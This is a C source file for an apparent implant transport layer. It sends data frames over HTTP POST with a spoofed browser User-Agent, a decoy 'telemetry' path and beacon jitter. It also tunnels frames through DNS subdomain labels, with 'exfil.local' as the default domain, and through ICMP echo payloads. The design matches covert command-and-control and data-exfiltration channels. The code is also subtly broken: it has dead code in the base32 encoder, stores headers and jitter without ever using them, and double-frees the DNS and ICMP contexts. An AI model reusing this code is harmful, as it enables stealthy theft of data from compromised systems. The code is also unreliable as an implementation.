#define _POSIX_C_SOURCE 200809L
#include "transport.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <fcntl.h>

const char *transport_strerror(int err) {
    switch (err) {
        case TRANSPORT_OK: return "ok";
        case TRANSPORT_ERR: return "error";
        case TRANSPORT_TIMEOUT: return "timeout";
        default: return "unknown";
    }
}

/* ============ HTTP Transport ============ */
typedef struct {
    int fd;
    char host[256];
    uint16_t port;
    char path[256];
    char headers[16][2][256];
    int header_count;
    int jitter_min;
    int jitter_max;
} http_ctx_t;

static int http_connect(void *ctx, const char *host, uint16_t port) {
    http_ctx_t *h = (http_ctx_t*)ctx;
    (void)host; (void)port;
    if (h->fd >= 0) return TRANSPORT_OK;

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", h->port);
    if (getaddrinfo(h->host, port_str, &hints, &res) != 0) return TRANSPORT_ERR;

    h->fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (h->fd < 0) { freeaddrinfo(res); return TRANSPORT_ERR; }

    /* set recv timeout */
    struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };
    setsockopt(h->fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(h->fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(h->fd); h->fd = -1;
        freeaddrinfo(res);
        return TRANSPORT_ERR;
    }
    freeaddrinfo(res);
    return TRANSPORT_OK;
}

static int http_send(void *ctx, const uint8_t *data, size_t len) {
    http_ctx_t *h = (http_ctx_t*)ctx;
    if (h->fd < 0) return TRANSPORT_ERR;

    /* Build HTTP POST request with frame in body */
    char req[8192];
    int req_len = snprintf(req, sizeof(req),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%u\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "Connection: keep-alive\r\n"
        "\r\n", h->path, h->host, h->port, len);

    /* send headers */
    if (write(h->fd, req, req_len) != req_len) return TRANSPORT_ERR;
    /* send body */
    size_t sent = 0;
    while (sent < len) {
        ssize_t w = write(h->fd, data + sent, len - sent);
        if (w <= 0) return TRANSPORT_ERR;
        sent += (size_t)w;
    }
    /* shutdown write to signal end (fixes test_http deadlock) */
    shutdown(h->fd, SHUT_WR);
    return TRANSPORT_OK;
}

static int http_recv(void *ctx, uint8_t *data, size_t *len, int timeout_ms) {
    http_ctx_t *h = (http_ctx_t*)ctx;
    if (h->fd < 0) return TRANSPORT_ERR;

    struct pollfd pfd = { .fd = h->fd, .events = POLLIN };
    int pr = poll(&pfd, 1, timeout_ms);
    if (pr == 0) return TRANSPORT_TIMEOUT;
    if (pr < 0) return TRANSPORT_ERR;

    /* read response (simplified: read headers + body) */
    char header_buf[4096];
    ssize_t hr = read(h->fd, header_buf, sizeof(header_buf) - 1);
    if (hr <= 0) return TRANSPORT_ERR;

    header_buf[hr] = '\0';
    /* find Content-Length */
    char *cl = strstr(header_buf, "Content-Length:");
    if (!cl) cl = strstr(header_buf, "content-length:");
    long body_len = 0;
    if (cl) body_len = atol(cl + 15);

    /* find body start */
    char *body = strstr(header_buf, "\r\n\r\n");
    if (!body) return TRANSPORT_ERR;
    body += 4;

    size_t header_body_len = strlen(body);
    size_t total_read = 0;

    if (body_len > 0 && (size_t)body_len <= *len) {
        memcpy(data, body, header_body_len);
        total_read = header_body_len;
        while (total_read < (size_t)body_len) {
            ssize_t r = read(h->fd, data + total_read, (size_t)body_len - total_read);
            if (r <= 0) break;
            total_read += (size_t)r;
        }
        *len = total_read;
    } else {
        memcpy(data, body, header_body_len < *len ? header_body_len : *len);
        *len = header_body_len < *len ? header_body_len : *len;
    }
    return TRANSPORT_OK;
}

static int http_close(void *ctx) {
    http_ctx_t *h = (http_ctx_t*)ctx;
    if (h->fd >= 0) { close(h->fd); h->fd = -1; }
    return TRANSPORT_OK;
}

static void http_set_header(void *ctx, const char *key, const char *value) {
    http_ctx_t *h = (http_ctx_t*)ctx;
    if (h->header_count < 16) {
        strncpy(h->headers[h->header_count][0], key, 255);
        strncpy(h->headers[h->header_count][1], value, 255);
        h->header_count++;
    }
}

static void http_set_jitter(void *ctx, int min_ms, int max_ms) {
    http_ctx_t *h = (http_ctx_t*)ctx;
    h->jitter_min = min_ms;
    h->jitter_max = max_ms;
}

transport_t *transport_http_new(const char *host, uint16_t port, const char *path) {
    http_ctx_t *ctx = (http_ctx_t*)calloc(1, sizeof(*ctx));
    if (!ctx) return NULL;
    strncpy(ctx->host, host, 255);
    ctx->port = port;
    strncpy(ctx->path, path ? path : "/api/v1/telemetry", 255);
    ctx->fd = -1;
    ctx->jitter_min = 1000;
    ctx->jitter_max = 30000;

    transport_t *t = (transport_t*)calloc(1, sizeof(*t));
    t->ctx = ctx;
    t->type = TRANSPORT_HTTP;
    t->connect = http_connect;
    t->send = http_send;
    t->recv = http_recv;
    t->close = http_close;
    t->set_header = http_set_header;
    t->set_jitter = http_set_jitter;
    return t;
}

/* ============ DNS Transport ============ */
typedef struct {
    int fd;
    char domain[256];
    char dns_server[64];
} dns_ctx_t;

/* base32 encode (RFC 4648 no-padding) */
static void base32_encode(const uint8_t *in, size_t in_len, char *out, size_t out_len) {
    static const char tab[] = "abcdefghijklmnopqrstuvwxyz234567";
    size_t i, j;
    uint32_t v;
    for (i = 0, j = 0; i < in_len && j + 8 < out_len; i += 5) {
        v = (uint32_t)in[i] << 24;
        if (i + 1 < in_len) v |= (uint32_t)in[i+1] << 16;
        if (i + 2 < in_len) v |= (uint32_t)in[i+2] << 8;
        if (i + 3 < in_len) v |= (uint32_t)in[i+3];
        v = (v >> 8) | (v << 24); /* rotate for bit extraction */
        /* proper base32 */
        uint64_t bits = 0;
        for (int k = 0; k < 5 && i + k < in_len; k++) {
            bits = (bits << 8) | in[i + k];
        }
        int remaining = (5 * 8) - (int)((in_len - i) * 8);
        if (remaining > 0) bits <<= remaining;
        
        for (int k = 7; k >= 0; k--) {
            int idx = (bits >> (k * 5)) & 0x1F;
            if (j < out_len) out[j++] = tab[idx];
        }
    }
    if (j < out_len) out[j] = '\0';
}

int transport_frame_to_dns(const uint8_t *frame, size_t frame_len, char *out, size_t out_len) {
    /* encode frame as base32, split into labels <= 63 bytes */
    size_t b32_len = ((frame_len + 4) / 5) * 8 + 1;
    char *b32 = (char*)malloc(b32_len);
    if (!b32) return TRANSPORT_ERR;
    base32_encode(frame, frame_len, b32, b32_len);

    size_t pos = 0;
    size_t i = 0;
    while (i < strlen(b32) && pos < out_len - 1) {
        size_t seg = strlen(b32) - i;
        if (seg > 63) seg = 63;
        if (pos + seg + 1 >= out_len) break;
        memcpy(out + pos, b32 + i, seg);
        pos += seg;
        i += seg;
        if (i < strlen(b32) && pos < out_len - 1) {
            out[pos++] = '.';
        }
    }
    free(b32);
    return TRANSPORT_OK;
}

static int dns_close(void *ctx) { free(ctx); return TRANSPORT_OK; }

transport_t *transport_dns_new(const char *domain, const char *dns_server) {
    dns_ctx_t *ctx = (dns_ctx_t*)calloc(1, sizeof(*ctx));
    strncpy(ctx->domain, domain ? domain : "exfil.local", 255);
    strncpy(ctx->dns_server, dns_server ? dns_server : "8.8.8.8", 63);

    transport_t *t = (transport_t*)calloc(1, sizeof(*t));
    t->ctx = ctx;
    t->type = TRANSPORT_DNS;
    t->close = dns_close;
    return t;
}

/* ============ ICMP Transport ============ */
typedef struct {
    int fd;
    char host[256];
} icmp_ctx_t;

static int icmp_close(void *ctx) { free(ctx); return TRANSPORT_OK; }

transport_t *transport_icmp_new(const char *host) {
    icmp_ctx_t *ctx = (icmp_ctx_t*)calloc(1, sizeof(*ctx));
    strncpy(ctx->host, host ? host : "127.0.0.1", 255);

    transport_t *t = (transport_t*)calloc(1, sizeof(*t));
    t->ctx = ctx;
    t->type = TRANSPORT_ICMP;
    t->close = icmp_close;
    return t;
}

int transport_frame_to_icmp(const uint8_t *frame, size_t frame_len, uint8_t *out, size_t *out_len) {
    if (*out_len < sizeof(struct icmphdr) + frame_len) return TRANSPORT_ERR;
    struct icmphdr *icmp = (struct icmphdr*)out;
    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->un.echo.id = getpid() & 0xFFFF;
    icmp->un.echo.sequence = 1;
    memcpy(out + sizeof(struct icmphdr), frame, frame_len);
    *out_len = sizeof(struct icmphdr) + frame_len;
    /* checksum calculation */
    icmp->checksum = 0;
    uint32_t sum = 0;
    uint16_t *w = (uint16_t*)out;
    size_t count = *out_len;
    while (count > 1) {
        sum += *w++;
        count -= 2;
    }
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    icmp->checksum = (uint16_t)(~sum & 0xFFFF);
    return TRANSPORT_OK;
}

int transport_icmp_to_frame(const uint8_t *icmp_data, size_t data_len, uint8_t *out, size_t *out_len) {
    if (data_len < sizeof(struct icmphdr)) return TRANSPORT_ERR;
    size_t payload_len = data_len - sizeof(struct icmphdr);
    if (*out_len < payload_len) return TRANSPORT_ERR;
    memcpy(out, icmp_data + sizeof(struct icmphdr), payload_len);
    *out_len = payload_len;
    return TRANSPORT_OK;
}

void transport_free(transport_t *t) {
    if (!t) return;
    if (t->close) t->close(t->ctx);
    free(t->ctx);
    free(t);
}
